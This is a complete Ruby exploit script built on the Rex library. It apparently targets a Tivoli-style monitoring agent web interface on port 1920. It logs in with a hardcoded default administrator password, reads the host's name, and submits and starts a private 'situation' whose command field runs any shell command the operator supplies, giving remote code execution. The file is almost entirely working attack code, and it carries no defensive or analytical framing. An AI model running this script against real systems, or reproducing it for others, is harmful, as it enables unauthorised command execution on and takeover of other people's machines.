#!/usr/bin/env ruby 
require 'rex'

target  = ARGV[0]
execute = ARGV[1]
	
sock = Rex::Proto::Http::Client.new(target, port = 1920, context = {}, ssl = false)
login = Rex::Text.encode_base64("1xadministrator:!QAZ@WSX1qaz2wsx")
job = Rex::Text.rand_text_alpha_upper(10)

begin
# grab the hostname
reqa = sock.request_cgi(
	{
		'uri'   => '/',
		'version' => '1.1',
		'method' => 'GET',
	})

res = sock.send_request(reqa)
data = sock.read_response()

	if data.code and data.code == 200
		hostname = data.body.scan(/Service Point:([^\)]+)<ul>/).flatten.first.strip
		puts "[*] Target hostname is: #{hostname}"
			req = sock.request_cgi(
				{
					'uri'   => '/' + hostname,
					'version' => '1.1',
					'method' => 'GET',
					'headers' => {
						'Authorization' =>  "Basic " + login,
						'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
						'Accept-Language' => 'en-US,en;q=0.5',
						'Accept-Encoding' => 'gzip, deflate',
						'Connection' => 'keep-alive',
					},
				})

			res = sock.send_request(req)
			data = sock.read_response()
# login and set the job.

				if data.code and data.code == 200
					sessionid = data.headers['Set-Cookie'].split(';')[0]
					puts "[*] Got cookie: #{sessionid}"
#					command = "<AGENTINFO></AGENTINFO>"
command = %Q|<PRIVATECONFIGURATION>
<PRIVATESIT>
<SITUATION NAME="#{job}"  INTERVAL="000500" />
<CRITERIA>
<![CDATA[ *VALUE NT_Process.%_Processor_Time *GE 65 *AND 
  *VALUE NT_Process.Priority_Base *NE 0 *AND
  *VALUE NT_Process.Process_Name *NE _Total]]>
</CRITERIA>
<CMD><![CDATA[ #{execute}]]></CMD> 
<AUTOSOPT When="N" Frequency="N" /> 
</PRIVATESIT>
</PRIVATECONFIGURATION>
|
						req2 = sock.request_cgi(
							{
								'uri'   => "///#{hostname}/#{hostname}/html/default.htm",
								'version' => '1.1',
								'method' => 'POST',
								'cookie' => sessionid,
								'data'   => command,
								'headers' => {
										'Authorization' =>  "Basic " + login,
										'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
										'Accept-Language' => 'en-US,en;q=0.5',
										'Accept-Encoding' => 'gzip, deflate',
										'Connection' => 'keep-alive',
								},
							})

						puts "[*] Created job '#{job}' with command '#{execute}'"
						res2 = sock.send_request(req2)
						data = sock.read_response()
						
						if data and data.body =~ /Success/
							puts "[*] '#{job}' submitted!"
command2 = %Q|<PVTCONTROL>
 <PVTCOMMAND>
	 <PVTSITNAME>#{job}</PVTSITNAME>
	 <PVTACTION>START</PVTACTION>
 </PVTCOMMAND>
</PVTCONTROL>
|
								req3 = sock.request_cgi(
									{
										'uri'   => "///#{hostname}/#{hostname}/html/default.htm",
										'version' => '1.1',
										'method' => 'POST',
										'cookie' => sessionid,
										'data'   => command2,
										'headers' => {
												'Authorization' =>  "Basic " + login,
												'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
												'Accept-Language' => 'en-US,en;q=0.5',
												'Accept-Encoding' => 'gzip, deflate',
												'Connection' => 'keep-alive',
										},
									})
								res3 = sock.send_request(req3)
								data = sock.read_response()
									if data and data.body =~ /Request completed successfully/
										puts "[*] '#{job}' executed successfully"
									else
										puts "[!] Failed"
									end
						else
							puts "[!] Failed"
						end
				else
					puts "[!] Invalid Login!!"
				end
	end
rescue => e
puts "[!] Error: #{e}"
end
